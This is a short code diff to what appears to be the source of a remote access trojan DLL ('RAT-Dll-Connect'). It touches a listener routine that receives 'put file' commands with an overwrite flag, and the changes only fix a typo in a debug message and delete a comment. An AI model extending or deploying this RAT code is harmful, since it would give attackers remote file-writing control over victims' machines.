@@ -138,7 +138,7 @@ INT startListen()
                 }
 
                 CONST UINT64 fileBytesSize = strlen(recvBuf);
-                sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Performing put filewith %i bytes...\n", fileBytesSize);
+                sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Performing put file with %i bytes...\n", fileBytesSize);
                 OutputDebugStringA(msgBuf);
 
                 // Just a char buffer containing our bytes 
@@ -163,7 +163,6 @@ INT startListen()
                     continue;
                 }
 
-                // this feels weird
                 BOOL overwrite = *recvBuf;
                 sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Put file overwrite value %i ...\n", overwrite);
                 OutputDebugStringA(msgBuf);
